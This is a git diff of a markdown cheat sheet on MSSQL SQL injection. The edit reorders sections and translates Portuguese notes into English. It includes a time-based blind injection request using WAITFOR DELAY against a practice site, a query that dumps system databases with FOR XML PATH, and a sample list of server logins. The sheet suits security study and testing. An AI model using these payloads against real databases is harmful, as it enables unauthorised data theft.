@@ -37,30 +37,15 @@ Req
 GET /Make/2?orderby=supercarid;WAITFOR+DELAY+'00:00:04'-- HTTP/2
 Host: hack-yourself-first.com
 ```
-
-## Useful Queries
-
-**CAUTION**
-The following query should be executed with caution as it has the potential to impact the performance of MSSQL, depending on the size of the table entries returned. It is recommended to run it only when there is confidence that the returned row isn't excessively long.
-
-### DUMP all in one shot using XML
-Request
-```
-(select * from master..sysdatabases) for xml PATH('')
-```
-Response
-```
-<name>master</name><dbid>1</dbid><sid>AQ==</sid><mode>0</mode><status>65544</status><status2>
-```
 ## Concepts
 
 ### Aspas duplas e simples são tratadas de diferentes formas no MSSQL
 
-A razão pela qual SELECT DB_NAME('1') funciona e SELECT DB_NAME("1") não funciona é que as aspas duplas não são interpretadas da mesma maneira que as aspas simples em SQL Server.
+The reason why ```SELECT DB_NAME('1')``` works and ```SELECT DB_NAME("1")``` does not work is that double quotes are not interpreted the same way as single quotes in SQL Server.
 
-Quando você usa aspas duplas, o SQL Server as trata como um delimitador de identificadores de objetos, não como delimitadores de strings. No caso da função DB_NAME, ela espera uma string como argumento, e essa string deve ser delimitada por aspas simples.
+When you use **double quotes**, SQL Server treats them as **delimiters for object identifiers, not as string delimiters**. In the case of the **DB_NAME function, it expects a string as an argument**, and this string should be delimited by single quotes.
 
-Dessa forma, a função DB_NAME recebe corretamente a string "1" como argumento. Se você tentar usar aspas duplas, o SQL Server interpretará isso como um identificador de objeto e resultará em um erro.
+Therefore, the DB_NAME function correctly receives the string "1" as an argument. **If you attempt to use double quotes, SQL Server will interpret it as an object identifier**, resulting in an error.
 
 ### Structure
 Master – All system objects to run the active relational database management system
@@ -101,7 +86,22 @@ Result
 ```
 [{"name":"sa"},{"name":"##MS_SQLResourceSigningCertificate##"},{"name":"##MS_SQLReplicationSigningCertificate##"},{"name":"##MS_SQLAuthenticatorCertificate##"},{"name":"##MS_PolicySigningCertificate##"},{"name":"##MS_SmoExtendedSigningCertificate##"},{"name":"##MS_PolicyEventProcessingLogin##"},{"name":"##MS_PolicyTsqlExecutionLogin##"},{"name":"##MS_AgentSigningCertificate##"},{"name":"BUILTIN\\Administrators"},{"name":"NT AUTHORITY\\SYSTEM"},{"name":"NT AUTHORITY\\NETWORK SERVICE"}]
 ```
-* Note: "JSON PATH" é muito referenciado, mas ele é mais utilizado quando se está construindo uma querie e deseja formatar como será a saída do JSON. 
+* Note: "JSON PATH" is frequently referenced, but it is most commonly used when constructing a query and you want to specify how the JSON output will be formatted.
+
+## Useful Queries
+
+**CAUTION**
+The following query should be executed with caution as it has the potential to impact the performance of MSSQL, depending on the size of the table entries returned. It is recommended to run it only when there is confidence that the returned row isn't excessively long.
+
+### DUMP all in one shot using XML
+Request (for JSON auto could be also used)
+```
+(select * from master..sysdatabases) for xml PATH('')
+```
+Response
+```
+<name>master</name><dbid>1</dbid><sid>AQ==</sid><mode>0</mode><status>65544</status><status2>
+```
 
 ## Inspired by
 * https://blog.improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links
